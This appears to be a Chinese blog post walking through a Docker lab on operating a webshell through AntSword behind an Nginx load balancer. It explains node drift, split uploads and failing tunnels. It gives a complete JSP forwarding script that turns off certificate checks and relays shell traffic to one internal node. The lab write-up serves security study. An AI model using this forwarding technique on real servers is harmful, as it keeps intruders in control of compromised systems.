<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Nginx负载均衡下的webshell连接 - 编程中国的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Nginx负载均衡下的webshell连接" />
<meta property="og:description" content="一、WebShell简介 “web”的含义是显然 需要服务器开放web服务，“shell”的含义是 取得对服务器某种程度上操作权限。
webshell，顾名思义：web指的是在web服务器上，而shell是用脚本语言编写的脚本程序，webshell就是就是web的一个管理工具，可以对web服务器进行操作的权限，也叫webadmin。webshell一般是被网站管理员用于网站管理、服务器管理等等一些用途，但是由于webshell的功能比较强大，可以上传下载文件，查看数据库，甚至可以调用一些服务器上系统的相关命令（比如创建用户，修改删除文件之类的），通常被黑客利用，黑客通过一些上传方式，将自己编写的webshell上传到web服务器的页面的目录下，然后通过页面访问的形式进行入侵，或者通过插入一句话连接本地的一些相关工具直接对服务器进行入侵操作。
二、搭建环境 1、配置环境 在github上将蚁剑的演示环境下载下来，上传至虚拟机中。
在虚拟机中解压并进行docker compose命令进行拉取
# 将上传的环境文件进行解压 root@ubuntu:~# unzip AntSword-Labs-master.zip root@ubuntu:~# mv AntSword-Labs-master ant # 改名（方便记忆） 进入该目录 root@ubuntu:~# cd ant/loadbalance/loadbalance-jsp/ root@ubuntu:~/ant/loadbalance/loadbalance-jsp# ll total 24 drwxr-xr-x 4 root root 4096 May 17 2021 ./ drwxr-xr-x 3 root root 4096 May 17 2021 ../ -rw-r--r-- 1 root root 373 May 17 2021 docker-compose.yml drwxr-xr-x 2 root root 4096 May 17 2021 nginx/ -rw-r--r-- 1 root root 2557 May 17 2021 README." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/7063af0ee9fa1464c38a08eae483c1ec/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-01-29T01:02:31+08:00" />
<meta property="article:modified_time" content="2024-01-29T01:02:31+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程中国的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Nginx负载均衡下的webshell连接</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2 style="background-color:transparent;">一、WebShell简介</h2> 
<p>“web”的含义是显然 需要服务器开放web服务，“shell”的含义是 取得对服务器某种程度上操作权限。</p> 
<p>webshell，顾名思义：web指的是在web服务器上，而shell是用脚本语言编写的脚本程序，webshell就是就是web的一个管理工具，可以对web服务器进行操作的权限，也叫webadmin。webshell一般是被网站管理员用于网站管理、服务器管理等等一些用途，但是由于webshell的功能比较强大，可以上传下载文件，查看数据库，甚至可以调用一些服务器上系统的相关命令（比如创建用户，修改删除文件之类的），通常被黑客利用，黑客通过一些上传方式，将自己编写的webshell上传到web服务器的页面的目录下，然后通过页面访问的形式进行入侵，或者通过插入一句话连接本地的一些相关工具直接对服务器进行入侵操作。</p> 
<h2>二、搭建环境</h2> 
<h3 style="background-color:transparent;">1、配置环境</h3> 
<p>在github上将蚁剑的演示环境下载下来，上传至虚拟机中。</p> 
<p><img alt="" height="726" src="https://images2.imgbox.com/91/0c/kPoIIn8r_o.png" width="1200"></p> 
<p>在虚拟机中解压并进行<span style="color:#fe2c24;"><strong>docker  compose</strong></span>命令进行拉取</p> 
<pre><code class="language-bash"># 将上传的环境文件进行解压
root@ubuntu:~# unzip AntSword-Labs-master.zip 
root@ubuntu:~# mv AntSword-Labs-master ant    # 改名（方便记忆）
进入该目录
root@ubuntu:~# cd ant/loadbalance/loadbalance-jsp/
root@ubuntu:~/ant/loadbalance/loadbalance-jsp# ll
total 24
drwxr-xr-x 4 root root 4096 May 17  2021 ./
drwxr-xr-x 3 root root 4096 May 17  2021 ../
-rw-r--r-- 1 root root  373 May 17  2021 docker-compose.yml
drwxr-xr-x 2 root root 4096 May 17  2021 nginx/
-rw-r--r-- 1 root root 2557 May 17  2021 README.md
drwxr-xr-x 3 root root 4096 May 17  2021 tomcat-8-jre8/

# 拉取
root@ubuntu:~/ant/loadbalance/loadbalance-jsp# docker compose up -d
</code></pre> 
<p>看到此文件即可docker拉取</p> 
<p><img alt="" height="189" src="https://images2.imgbox.com/38/9a/W884ugfn_o.png" width="772"></p> 
<p>拉取并且已经运行成功</p> 
<p><img alt="" height="166" src="https://images2.imgbox.com/49/2b/iILr2sXH_o.png" width="1200"></p> 
<p>我们的环境架构如下图所示（<strong>nginx服务器反向代理两个节点服务器</strong>）</p> 
<p><img alt="" height="350" src="https://images2.imgbox.com/ad/84/hAuQrIXh_o.png" width="580"></p> 
<h3>2、通过蚁剑连接</h3> 
<p>我们假定在真实的业务系统上，存在一个 RCE 漏洞，可以让我们获取 WebShell</p> 
<p>（根据以下内容，此环境具有RCE漏洞）</p> 
<p><img alt="" height="156" src="https://images2.imgbox.com/7a/16/HbKVhc4z_o.png" width="1200"></p> 
<p></p> 
<p>在蚁剑上连接测试：</p> 
<p><img alt="" height="680" src="https://images2.imgbox.com/69/61/nr6kNp0H_o.png" width="992"></p> 
<p></p> 
<h4>难点：</h4> 
<p><strong>难点一</strong>：我们需要在<strong>每一台节点</strong>的<strong>相同位置</strong>都上传<strong>相同内容的 WebShell</strong></p> 
<p>当我们上传内容是，一旦有一台机器上没有，那么在请求轮到这台机器上的时候，就会出现 404 错误，影响使用。<strong>这就是你出现一会儿正常，一会儿错误的原因。</strong></p> 
<p>例如以下，当我们创建一个文件后，在刷新就会看到文件消失，在刷新又能看到，这就是负载均衡的流量飘逸</p> 
<p><img alt="" height="490" src="https://images2.imgbox.com/43/7a/GUKBg0aV_o.png" width="737"></p> 
<p><img alt="" height="194" src="https://images2.imgbox.com/f1/4e/rgrv4xRI_o.png" width="944"></p> 
<p>当再次刷新后就消失了</p> 
<p><img alt="" height="158" src="https://images2.imgbox.com/16/e4/Wsk2wAyE_o.png" width="956"></p> 
<p><strong>解决办法：</strong>这个难点只需我们在多次刷新文件然后内容多保存几次<strong>即可解决</strong></p> 
<p><img alt="" height="616" src="https://images2.imgbox.com/9d/6f/wxNPuhNU_o.png" width="1200"></p> 
<p><img alt="" height="127" src="https://images2.imgbox.com/80/1e/m6mE9NvH_o.png" width="672"></p> 
<p></p> 
<p><strong>难点二</strong>：我们在执行命令时，<strong>无法知道下次的请求交给哪台机器去执行</strong>。         </p> 
<p>当我们要执行某个命令时或者脚本，由下图可知，由于流量一直在飘，使得我们无法确定是否在我们想要执行的目标主机上，让人很难受</p> 
<p><img alt="" height="468" src="https://images2.imgbox.com/8b/9b/FZvrsRNA_o.png" width="610"></p> 
<p><strong>难点三：</strong>当我们需要上传一些工具<strong>时，麻烦来了</strong></p> 
<p>当我们想向目标主机上传一些我们自己的工具时，由于 antSword 上传文件时，采用的分片上传方式，把一个文件分成了多次HTTP请求发送给了目标 ，由于数据会一直飘，导致我们上传的工具会被分成多片上传至不同主机，无法在一个主机上拥有我们的完整工具。如下：</p> 
<p>比如上传这个1272kb的文件</p> 
<p><img alt="" height="50" src="https://images2.imgbox.com/c7/00/IQFmc4wI_o.png" width="955"></p> 
<p>由此可见，我们的文件本分割成了两份，是不完整的</p> 
<p><img alt="" height="239" src="https://images2.imgbox.com/7e/58/jpI1YjC2_o.png" width="955"></p> 
<p><img alt="" height="256" src="https://images2.imgbox.com/ee/1a/e6GneQxM_o.png" width="959"></p> 
<p><strong>解决办法</strong>：这个解决办法，只要我们能找到足够小的工具，name就有可能实现我们的目的，相对来说能容易实现点。</p> 
<p></p> 
<p><strong>难点四：由于目标机器不能出外网，想进一步深入，只能使用 reGeorg/HTTPAbs 等 HTTP Tunnel，可在这个场景下，这些 tunnel 脚本全部都失灵了。</strong></p> 
<p>这个问题就很难解决了，只能通过和目标机器的所在网络的边界出口设备上建立一条隧道，那么久可以访问他的内网，但是还会出现上面的问题，我们所访问的目标主机的流量会因为nginx的负载均衡会出现飘逸，使得我们还是无法正确连接到我们想要访问的目标主机，那要怎么解决这个问题呢?</p> 
<p></p> 
<h4>解决办法:</h4> 
<p><strong>1、</strong>关掉其中一台机器<strong>（作死）</strong></p> 
<p>        <span style="color:#fe2c24;"><strong>非常不建议</strong></span>，（除非你有足够的权限，可以测试可行性），在真是环境中，关掉机器会影响人家的业务，非常容易出事。</p> 
<p>2、<strong>执行前先判断要不要执行</strong></p> 
<p><strong>        </strong>通过脚本或者命令判断是否是自己所要访问的目标，判断之后再进行以后的操作，不推荐，还有一些问题以及不够灵活</p> 
<p>3、<strong>在Web 层做一次 HTTP 流量转发 </strong></p> 
<p>        我们用 AntSword 没法直接访问 LBSNode1 内网IP(172.18.0.2)的 8080 端口，但是有人能访问呀，除了 nginx 能访问之外，<strong>LBSNode2 这台机器也是可以访问 Node1 这台机器的 8080 端口</strong>的。</p> 
<p>        通过以上结果，那么我们可以通过一个流量转发脚本实现我们的流量最终都会流向我们所要访问的主机来实现我们的目的。过程如下：</p> 
<p><img alt="" height="933" src="https://images2.imgbox.com/de/b5/tmTdIFo5_o.png" width="1200"></p> 
<blockquote> 
 <p>我们一步一步来看这个图，我们的目的是：<strong>所有的数据包都能发给「LBSNode 1」这台机器。</strong></p> 
 <p>首先是 第 1 步，我们请求 /antproxy.jsp，这个请求发给 nginx</p> 
 <p>nginx 接到数据包之后，会有两种情况：</p> 
 <p>我们先看黑色线 ，/antproxy.jsp 把请求重组之后，传给了 Node1 机器上的 /ant.jsp，成功执行。</p> 
 <p>再来看红色线，第 2 步把请求传给了 Node2 机器, 接着第 3 步，Node2 机器上面的 /antproxy.jsp 把请求重组之后，传给了 Node1 的 /ant.jsp，成功执行。</p> 
</blockquote> 
<h5>实现：</h5> 
<p>前提准备：需要保证容器下的环境有ifconfig命令</p> 
<blockquote> 
 <p>apt-get update<br> apt-get install net-tools                # ifconfig命令支持包</p> 
</blockquote> 
<p>1、<strong>创建 antproxy.jsp 脚本</strong></p> 
<p><strong>改转发地址</strong>，转向<strong>目标 Node</strong> 的 内网IP的 <strong>目标脚本</strong> 访问地址。</p> 
<pre><code class="language-bash">&lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt;
&lt;%@ page import="javax.net.ssl.*" %&gt;
&lt;%@ page import="java.io.ByteArrayOutputStream" %&gt;
&lt;%@ page import="java.io.DataInputStream" %&gt;
&lt;%@ page import="java.io.InputStream" %&gt;
&lt;%@ page import="java.io.OutputStream" %&gt;
&lt;%@ page import="java.net.HttpURLConnection" %&gt;
&lt;%@ page import="java.net.URL" %&gt;
&lt;%@ page import="java.security.KeyManagementException" %&gt;
&lt;%@ page import="java.security.NoSuchAlgorithmException" %&gt;
&lt;%@ page import="java.security.cert.CertificateException" %&gt;
&lt;%@ page import="java.security.cert.X509Certificate" %&gt;
&lt;%!
  public static void ignoreSsl() throws Exception {
        HostnameVerifier hv = new HostnameVerifier() {
            public boolean verify(String urlHostName, SSLSession session) {
                return true;
            }
        };
        trustAllHttpsCertificates();
        HttpsURLConnection.setDefaultHostnameVerifier(hv);
    }
    private static void trustAllHttpsCertificates() throws Exception {
        TrustManager[] trustAllCerts = new TrustManager[] { new X509TrustManager() {
            public X509Certificate[] getAcceptedIssuers() {
                return null;
            }
            @Override
            public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {
                // Not implemented
            }
            @Override
            public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {
                // Not implemented
            }
        } };
        try {
            SSLContext sc = SSLContext.getInstance("TLS");
            sc.init(null, trustAllCerts, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
        } catch (KeyManagementException e) {
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
    }
%&gt;

&lt;%
# 我们将 target 指向了 LBSNode1 的 ant.jsp
        String target = "http://172.18.0.2:8080/ant.jsp";    # 我们将 target 指向了 LBSNode1 的 ant.jsp
        URL url = new URL(target);
        if ("https".equalsIgnoreCase(url.getProtocol())) {
            ignoreSsl();
        }
        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        StringBuilder sb = new StringBuilder();
        conn.setRequestMethod(request.getMethod());
        conn.setConnectTimeout(30000);
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setInstanceFollowRedirects(false);
        conn.connect();
        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        OutputStream out2 = conn.getOutputStream();
        DataInputStream in=new DataInputStream(request.getInputStream());
        byte[] buf = new byte[1024];
        int len = 0;
        while ((len = in.read(buf)) != -1) {
            baos.write(buf, 0, len);
        }
        baos.flush();
        baos.writeTo(out2);
        baos.close();
        InputStream inputStream = conn.getInputStream();
        OutputStream out3=response.getOutputStream();
        int len2 = 0;
        while ((len2 = inputStream.read(buf)) != -1) {
            out3.write(buf, 0, len2);
        }
        out3.flush();
        out3.close();
%&gt;</code></pre> 
<p>我们将脚本都写入到两个主机上</p> 
<p><strong>注意：</strong>我们此处不适用上传功能，会分片，导致脚本失效，只需在蚁剑上将文件多次保存即可</p> 
<p><img alt="" height="529" src="https://images2.imgbox.com/68/c1/9FEueg2L_o.png" width="1102"></p> 
<p><img alt="" height="885" src="https://images2.imgbox.com/7f/2e/EtsfHDrI_o.png" width="1200"></p> 
<p>这样既可在每个机器上写上转发脚本</p> 
<p><strong>2、修改 Shell 配置, 将 URL 部分填写为 antproxy.jsp 的地址，其它配置不变</strong></p> 
<p><img alt="" height="443" src="https://images2.imgbox.com/b2/37/DBdUt4Wx_o.png" width="1200"></p> 
<p>3、<strong>测试执行命令, 查看 IP</strong></p> 
<p><img alt="" height="358" src="https://images2.imgbox.com/80/22/EzNnqzfI_o.png" width="755"></p> 
<p><img alt="" height="341" src="https://images2.imgbox.com/59/7d/HxJHWqnT_o.png" width="787"></p> 
<p>由此可见，执行命令每次都是目标主机（172.18.0.2）</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/f0da8524f02f21cb1f28dd677d54f1ab/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Fluid Engine Development PIC/FLIP 代码分析</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/f3bd0417e255171a7c6e16ebdad2543a/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">24. 两两交换链表中的节点（力扣LeetCode）</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程中国的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>